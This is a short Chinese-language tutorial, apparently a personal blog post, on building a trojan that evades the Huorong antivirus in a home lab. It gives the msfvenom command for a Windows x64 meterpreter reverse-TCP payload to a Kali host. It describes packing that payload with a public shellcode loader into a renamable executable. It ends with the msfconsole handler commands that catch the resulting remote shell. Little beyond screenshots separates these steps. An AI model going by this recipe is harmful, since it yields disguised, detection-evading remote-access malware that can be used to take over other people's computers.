# 题记

        今天脑子里面蹦出来个想法，免杀木马然后cs上线，本来想让cs与msf联动的，但是出了点小问题，还是先研究免杀火绒吧。

# 环境

        Kali：192.168.0.119 win10:192.168.0.200

        工具地址：https://github.com/knownsec/shellcodeloader

# 步骤

1、在kali生成3.bin木马。

        msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.0.119 lport=4444 -f raw -o 3.bin

![](../Images/89bdd608a40ab316c81bbfca15806566.png)

![](../Images/c471428817b64419b392258414f25eaf.png)

2、把木马移到工具上做免杀。

![](../Images/d96215509201b12610b9be4ddebb78a2.png)

![](../Images/6b7899d1a61cae768b2da04d52948811.png)

![](../Images/566691f8621795e2f29ae58fc867d794.png)

生成loder.exe软件，可随意改名，运行就能上线。

![](../Images/02dd7dd11195f3ff1d6afa4ee2191df5.png)

3、kali开启监听。

        msfconsole

        use exploit/multi/handler

        set payload windows/x64/meterpreter/reverse\_tcp

        set lhost 192.168.0.119

        exploit

        然后运行exe

        上线

![](../Images/7140c3e4d33ae7bca33c262363cd7e75.png)
